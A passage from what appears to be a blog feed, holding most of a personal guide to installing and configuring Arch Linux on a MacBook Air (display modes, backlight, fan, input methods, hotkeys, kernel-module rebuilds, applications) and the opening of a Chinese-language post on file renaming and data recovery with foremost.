&lt;ul&gt;
&lt;li&gt;I'm pretty sure that &lt;code&gt;udev&lt;/code&gt; indeed detect the hotplug event, but &lt;code&gt;xrandr&lt;/code&gt; always shows that &lt;code&gt;DP1&lt;/code&gt;(external VGA monitor) is disconnected.  &lt;/li&gt;
&lt;li&gt;This can be solved by adding mode for &lt;code&gt;DP1&lt;/code&gt; (check commands above).  &lt;/li&gt;
&lt;li&gt;After adding modes, just type &lt;code&gt;xrandr --output eDP1 --auto --output DP1 --mode ${mode_name} --left-of eDP1&lt;/code&gt; again, even if &lt;code&gt;xrandr&lt;/code&gt; still shows that &lt;code&gt;DP1&lt;/code&gt; is disconnected, it works.  &lt;/li&gt;
&lt;li&gt;So, add all modes we need (1920x1080, 1280x720, 1024x768, ...) can be a workaroud for this problem.  &lt;/li&gt;
&lt;li&gt;I think the problem is on &lt;code&gt;xrandr&lt;/code&gt; cannot recongnize whether thunderbolt to VGA adapter is connected or not when hotplug.  &lt;/li&gt;
&lt;li&gt;Add below to &lt;code&gt;.xinitrc&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;xrandr --newmode &amp;quot;1920x1080_60.00&amp;quot;  173.00  1920 2048 2248 2576  1080 1083 1088 1120 -hsync +vsync  
xrandr --addmode DP1 1920x1080_60.00  

xrandr --newmode &amp;quot;1280x720_60.00&amp;quot;   74.50  1280 1344 1472 1664  720 723 728 748 -hsync +vsync  
xrandr --addmode DP1 1280x720_60.00  

xrandr --newmode &amp;quot;1024x768_60.00&amp;quot;   63.50  1024 1072 1176 1328  768 771 775 798 -hsync +vsync  
xrandr --addmode DP1 1024x768_60.00  

xrandr --output eDP1 --auto --output DP1 --mode 1920x1080_60.00 --left-of eDP1  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Birghtness&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S xorg-xbacklight&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;yaourt -S mba6x_bl-dkms&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;(2016/12/02 update)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;mba6x_bl-dkms&lt;/code&gt; now depends on &lt;code&gt;mba6x_bl_dkms-git&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;mba6x_bl-dkms-git-48.055d50d-1&lt;/code&gt; doesn't work with &lt;code&gt;linux-4.8.11-1&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Need to use &lt;code&gt;sudo rmmod mba6x_bl&lt;/code&gt; to make &lt;code&gt;xbacklight&lt;/code&gt; work.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;(optional) &lt;code&gt;yaourt -S lightum-git&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;For auto adjust keyboard and monitor birghtness by light sensor  &lt;/li&gt;
&lt;li&gt;The AUR version has bug, use this fork version &lt;a href="https://github.com/esoleyman/lightum"&gt;https://github.com/esoleyman/lightum&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;USB&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;yaourt -S pmount&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Fan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/MikaelStrom/macfanctld"&gt;https://github.com/MikaelStrom/macfanctld&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ yaourt -S macfanctld  
$ sudo systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; macfanctld  
$ sudo systemctl start macfanctld  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;IME&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S gcin&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S libchewing&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;for chewing input method  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S anthy&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;for Japanese input method  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo gtk-query-immodules-2.0 --update-cache&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Browser&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S firefox firefox-i18n-zh-tw&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Flash  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S flashplugin&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://addons.mozilla.org/en-US/firefox/addon/flashblock/"&gt;https://addons.mozilla.org/en-US/firefox/addon/flashblock/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Fonts&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S wqy-zenhei adobe-source-han-sans-tw-fonts&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Mobile&lt;/h3&gt;
&lt;h4&gt;USB-Tethering (Works out of box)&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Android_tethering#USB_tethering"&gt;https://wiki.archlinux.org/index.php/Android_tethering#USB_tethering&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Disconnect from other networks  &lt;/li&gt;
&lt;li&gt;Connect phone to computer via USB cable  &lt;/li&gt;
&lt;li&gt;Enable the tethering option from the phone  &lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;ip link&lt;/code&gt; and search &lt;code&gt;usb?&lt;/code&gt; or &lt;code&gt;enp?s??u?&lt;/code&gt; interface  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo dhcpcd ${interface}&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;ip link&lt;/code&gt; again to check if already got an ip on that interface  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Mount Android phone&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MTP"&gt;https://wiki.archlinux.org/index.php/MTP&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;install &lt;code&gt;libmtp&lt;/code&gt;, &lt;code&gt;android-file-transfer&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo pacman -S libmtp  
$ yaourt -S android-file-transfer  

&lt;span class="o"&gt;(&lt;/span&gt;connect Android phone to Arch Linux via USB&lt;span class="o"&gt;)&lt;/span&gt;  

$ aft-mtp-mount ~/mnt   // mount android to ~/mnt  
$ fusermount -u ~/mnt   // unmount  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Webcam&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;[UPDATED] see the info below  &lt;/p&gt;
&lt;p&gt;The Facetime HD webcam (included on 2013 MBAs onwards) is no longer UVC device, and therefore, does not work out of the box.&lt;br /&gt;
It is actually a PCIE device.&lt;br /&gt;
While &lt;a href="https://github.com/patjak/bcwc_pcie"&gt;a bcwc_pcie driver is being developed&lt;/a&gt;, it will probably take some time before it is ready.&lt;br /&gt;
See also &lt;a href="https://bugzilla.kernel.org/show_bug.cgi?id=71131"&gt;Linux bug #71131&lt;/a&gt; and &lt;a href="https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1276811"&gt;Ubuntu bug #1276711&lt;/a&gt;.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MacBook#Webcam"&gt;https://wiki.archlinux.org/index.php/MacBook#Webcam&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;(2017/12/08 update)  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://aur.archlinux.org/packages/bcwc-pcie-git/"&gt;bcwc-pcie-git&lt;/a&gt; on AUR works.  &lt;ul&gt;
&lt;li&gt;Use &lt;code&gt;yaourt -S bcwc-pcie-git&lt;/code&gt; or download the tarball and use &lt;code&gt;makepkg -s&lt;/code&gt; to install it.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Disable MacBook Firmware Boot Sound&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://wiki.archlinux.org/index.php/MacBook#Arch_Linux_only"&gt;https://wiki.archlinux.org/index.php/MacBook#Arch_Linux_only&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The only special consideration is the MacBook firmware boot sound.&lt;br /&gt;
To ensure that this sound is off: mute the volume in OS X before continuing further.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I forgot to mute the volume before deleting the OS X.&lt;br /&gt;
So, I have to get an OS X installed on USB drive.&lt;br /&gt;
In order to mute the firmware boot sound and for the firmware updating in the furture.  &lt;/p&gt;
&lt;h3&gt;Hotkey Settings&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;use &lt;code&gt;xev&lt;/code&gt; to check the keymap  &lt;/li&gt;
&lt;li&gt;modify &lt;code&gt;rc.lua&lt;/code&gt; instead using &lt;code&gt;sxhkd&lt;/code&gt; if you are using awesomewm.  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/PulseAudio#Keyboard_volume_control"&gt;https://wiki.archlinux.org/index.php/PulseAudio#Keyboard_volume_control&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Add below to the globalkeys in &lt;code&gt;rc.lua&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-- MacBook Air function keys  
awful.key({ }, &amp;quot;XF86MonBrightnessDown&amp;quot;,  
    function ()  
        awful.util.spawn(&amp;quot;xbacklight -dec 10&amp;quot;)  
    end  
),  
awful.key({ }, &amp;quot;XF86MonBrightnessUp&amp;quot;,  
    function ()  
        awful.util.spawn(&amp;quot;xbacklight -inc 10&amp;quot;)  
    end  
),  
awful.key({ }, &amp;quot;XF86LaunchA&amp;quot;,  
    function ()  
        awful.util.spawn(&amp;quot;xrandr --output eDP1 --auto --output DP1 --mode 1920x1080_60.00 --left-of eDP1&amp;quot;)  
    end  
),  
awful.key({ }, &amp;quot;XF86LaunchB&amp;quot;,  
    function ()  
        awful.util.spawn(&amp;quot;xrandr --output eDP1 --auto --output DP1 --mode 1920x1080_60.00 --same-as eDP1&amp;quot;)  
    end  
),  
awful.key({ }, &amp;quot;XF86KbdBrightnessDown&amp;quot;,  
    function ()  
        awful.util.spawn(&amp;quot;kbdlight down 10&amp;quot;)  
    end  
),  
awful.key({ }, &amp;quot;XF86KbdBrightnessUp&amp;quot;,  
    function ()  
        awful.util.spawn(&amp;quot;kbdlight up 10&amp;quot;)  
    end  
),  
awful.key({ }, &amp;quot;XF86AudioMute&amp;quot;,  
    function ()  
        awful.util.spawn(&amp;quot;pactl set-sink-mute 0 toggle&amp;quot;)  
    end  
),  
awful.key({ }, &amp;quot;XF86AudioLowerVolume&amp;quot;,  
    function ()  
        awful.util.spawn(&amp;quot;pactl set-sink-mute 0 false&amp;quot;)  
        awful.util.spawn(&amp;quot;pactl set-sink-volume 0 -5%&amp;quot;)  
    end  
),  
awful.key({ }, &amp;quot;XF86AudioRaiseVolume&amp;quot;,  
    function ()  
        awful.util.spawn(&amp;quot;pactl set-sink-mute 0 false&amp;quot;)  
        awful.util.spawn(&amp;quot;pactl set-sink-volume 0 +5%&amp;quot;)  
    end  
)  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Kernel Upgrade&lt;/h3&gt;
&lt;p&gt;After the kernel upgrade,&lt;br /&gt;
there are no &lt;code&gt;wl&lt;/code&gt; and &lt;code&gt;mba6x_bl&lt;/code&gt; modules for the new kernel,&lt;br /&gt;
(Becasue these two modules are in AUR and not supported by the Official.)&lt;br /&gt;
so, we need to rebuild &lt;code&gt;broadcom-wl-dkms&lt;/code&gt; and &lt;code&gt;mba6x_bl-dkms&lt;/code&gt; again.&lt;br /&gt;
Otherwise, the wireless interface won't be detected and backlight cannot be tuned while using the new kernel.&lt;br /&gt;
Be sure to download the lastest version of these two packages before reboot to the new kernel.&lt;br /&gt;
Follow the instructions below should work.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo pacman -S linux-headers linux  

&lt;span class="o"&gt;(&lt;/span&gt;after kernel upgarde, download lastest version of these two packages&lt;span class="o"&gt;)&lt;/span&gt;  
$ yaourt -S broadcom-wl-dkms mba6x_bl-dkms  
$ reboot  

&lt;span class="o"&gt;(&lt;/span&gt;after reboot, rebuild these two kernel modules &lt;span class="k"&gt;for&lt;/span&gt; the new kernel and load them&lt;span class="o"&gt;)&lt;/span&gt;  
$ &lt;span class="nb"&gt;cd&lt;/span&gt; /var/cache/yaourt  
$ sudo pacman -U &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;broadcom&lt;/span&gt;&lt;span class="p"&gt;-wl-dkms_package&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;mba6x_bl&lt;/span&gt;&lt;span class="p"&gt;-dkms_package&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;  
$ sudo modprobe wl mba6x_bl  

$ reboot  //optional  
&lt;span class="o"&gt;(&lt;/span&gt;reboot again, and make sure that everything goes right.&lt;span class="o"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Upgrade all packages  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;yaourt -Syua&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Upgrade all packages (with refetching and recompling all git packages  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;yaourt -Syua --devel&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Misc&lt;/h2&gt;
&lt;p&gt;Below are my personal needed. It's optional.&lt;br /&gt;
&lt;a href="https://wiki.archlinux.org/index.php/List_of_applications"&gt;https://wiki.archlinux.org/index.php/List_of_applications&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S virtualbox virtualbox-host-modules&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S unrar&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Network&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S mosh mtr wget nmap&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S dns-tools&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;for &lt;code&gt;dig&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Drive&lt;/h3&gt;
&lt;p&gt;There are lots of 3rd party GNU/Linux clients for Google Drive:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/google/skicka"&gt;https://github.com/google/skicka&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/odeke-em/drive"&gt;https://github.com/odeke-em/drive&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/vitalif/grive2"&gt;https://github.com/vitalif/grive2&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/astrada/google-drive-ocamlfuse"&gt;https://github.com/astrada/google-drive-ocamlfuse&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a href="https://github.com/google/skicka"&gt;skicka&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Here, I chose &lt;code&gt;skicka&lt;/code&gt; because some of my friends had already tried it&lt;br /&gt;
and they felt good about it, espcially for the &lt;code&gt;encrypt&lt;/code&gt; funciton.  &lt;/p&gt;
&lt;p&gt;To install &lt;code&gt;skicka&lt;/code&gt; you need to install &lt;code&gt;go&lt;/code&gt; and &lt;code&gt;mercurial&lt;/code&gt; first.&lt;br /&gt;
Then, install &lt;code&gt;skicka&lt;/code&gt;, follow instructions below should work.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo pacman -S go mercurial  
$ mkdir ~/go  
$ &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;GOPATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;~/go  
$ &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$PATH&lt;/span&gt;:~/go/bin  
$ go get github.com/google/skicka  
$ skicka init  
$ skicka -no-browser-auth ls    // &lt;span class="nb"&gt;set&lt;/span&gt; authentication &lt;span class="k"&gt;for&lt;/span&gt; skicka  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You can check out &lt;a href="https://github.com/google/skicka/blob/master/README.md"&gt;https://github.com/google/skicka/blob/master/README.md&lt;/a&gt; for further info.  &lt;/p&gt;
&lt;p&gt;But, after I installed &lt;code&gt;skicka&lt;/code&gt;, it didn't find all my directories on Google Drive.&lt;br /&gt;
So, I just changed to &lt;code&gt;drive&lt;/code&gt;  &lt;/p&gt;
&lt;h4&gt;&lt;a href="https://github.com/odeke-em/drive"&gt;drive&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;use &lt;code&gt;yaourt -S drive&lt;/code&gt; to install it.&lt;br /&gt;
then &lt;code&gt;drive init ${dir_for_google_drive}&lt;/code&gt;&lt;br /&gt;
copy and paste the token, then it should work.&lt;br /&gt;
Check &lt;a href="https://github.com/odeke-em/drive/blob/master/README.md"&gt;https://github.com/odeke-em/drive/blob/master/README.md&lt;/a&gt; for more info.&lt;br /&gt;
(This command usage is a bit like &lt;code&gt;git&lt;/code&gt;)  &lt;/p&gt;
&lt;h3&gt;Python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S python2 python-pip&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pip install virtualenvwrapper&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Pelican&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;pip2 install pelican markdown ghp-import&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GitHub&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Add SSH Key  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://help.github.com/articles/generating-ssh-keys/#platform-linux"&gt;https://help.github.com/articles/generating-ssh-keys/#platform-linux&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Screenshot&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S shutter&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Terminal&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S rxvt-unicode guake&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Monitoring&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S htop glances lm_sensors&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo sensors-detect&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Multi-Media&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S eog&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S vlc&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;yaourt -S wine-git&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;need to uncomment &lt;code&gt;multilib&lt;/code&gt; in &lt;code&gt;/etc/pacman.conf&lt;/code&gt; first  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S playonlinux&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Office&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S evince&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;for .pdf files  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S libreoffice&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;App&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;TweetDeck  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;yaourt -S nwjs-bin&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/passcod/twd"&gt;https://github.com/passcod/twd&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;git clone https://github.com/passcod/twd.git&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;cd twd&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;nw .&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Still buggy and need package on AUR  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Slack  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/raelgc/scudcloud"&gt;https://github.com/raelgc/scudcloud&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;yaourt -S scudcloud&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Gitter  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;yaourt -S gitter&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Facebook Messenger  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;yaourt -S messengerfordesktop&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Popcorn-Time  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;yaourt -S popcorntime&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;References&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MacBook"&gt;MacBook - ArchWiki&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Arch Linux Only, Dual Boot, Arch Linux + OS X + Windows  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pandeiro/arch-on-air"&gt;pandeiro/arch-on-air · GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Dual Boot  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mandriva-usher.blogspot.tw/2014/02/gcin-firefox-stardic.html"&gt;Mandriva: gcin 無法使用於 firefox, stardic&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/General_recommendations"&gt;General recommendations - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Beginners'_guide"&gt;Beginners' guide - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/BlueDragonX/xf86-input-mtrack/blob/master/README.md"&gt;xf86-input-mtrack/README.md at master · BlueDragonX/xf86-input-mtrack · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MacBook#Mid_2013_13.22_-_Version_6.2C2"&gt;MacBook - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/List_of_applications"&gt;List of applications - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://help.ubuntu.com/community/MacBookAir6-2/Trusty"&gt;MacBookAir6-2/Trusty - Community Help Wiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Apple_Keyboard"&gt;Apple Keyboard - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Sxhkd"&gt;Sxhkd - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Bluetooth"&gt;Bluetooth - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Bluetooth_headset"&gt;Bluetooth headset - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://xatierlike.blogspot.tw/2015/05/skicka-google-drive-command-line-tool.html"&gt;(=..=)/: skicka: Google drive command line tool&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MTP"&gt;MTP - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/PulseAudio#Keyboard_volume_control"&gt;PulseAudio - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@PhilPlckthun/arch-linux-running-on-my-macbook-2ea525ebefe3"&gt;Arch Linux running on my MacBook — Medium&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Power_management"&gt;Power management - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MacBookPro11,x#Powersave"&gt;MacBookPro11,x - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Unia/powersave"&gt;GitHub - Unia/powersave: Linux power save settings, compatible with systemd&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Arch Linux"></category><category term="MacBook Air"></category><category term="Linux"></category><category term="COSCUP"></category></entry><entry><title>Data recovery by using foremost</title><link href="https://blog.m157q.tw/posts/2015/08/25/data-recovery-by-using-foremost/" rel="alternate"></link><published>2015-08-26T15:58:58+08:00</published><updated>2015-08-26T15:58:58+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-08-25:posts/2015/08/25/data-recovery-by-using-foremost/</id><summary type="html">&lt;h3&gt;溫馨小提醒&lt;/h3&gt;
&lt;p&gt;要把所有 *.JPG 轉成 *.jpg 的情況下&lt;br /&gt;
如果有 &lt;code&gt;rename&lt;/code&gt; 的話，可以這樣用 &lt;code&gt;rename "s/JPG/jpg/" *.JPG&lt;/code&gt;&lt;br /&gt;
如果沒有的話，我是這樣用 &lt;code&gt;find | grep .JPG | xargs -I {}.JPG mv {}.JPG {}.jpg&lt;/code&gt;&lt;br /&gt;
然後就悲劇了，因為如果以 .JPG 結尾的檔案有空白或啥其他特殊的符號的話，就會出現恐怖的意外&lt;br /&gt;
所以改成 &lt;code&gt;find | grep .JPG | xargs -I {}.JPG mv "{}.JPG" "{}.jpg"&lt;/code&gt; 才能避免悲劇發生&lt;br /&gt;
(應該吧?有錯請指正)  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;其實可以省略 grep  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;find -type f -name "*.JPG" | xargs -I {}.JPG mv "{}.JPG" "{}.jpg"&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;資料救援之路 with foremost&lt;/h3&gt;
&lt;p&gt;搜尋了一下相關資料&lt;br /&gt;
找到了 &lt;a href="https://wiki.archlinux.org/index.php/File_recovery"&gt;File recovery - ArchWiki&lt;/a&gt; 和 &lt;a href="https://help.ubuntu.com/community/DataRecovery"&gt;DataRecovery - Community Help Wiki&lt;/a&gt;&lt;br /&gt;
一開始是裝了 &lt;a href="http://extundelete.sourceforge.net/"&gt;extundelete&lt;/a&gt;&lt;br /&gt;
裝完以後才想到這顆外接硬碟是 NTFS 不是 ext4&lt;br /&gt;
所以看到底下的 &lt;a href="http://foremost.sourceforge.net/"&gt;Foremost&lt;/a&gt;&lt;br /&gt;
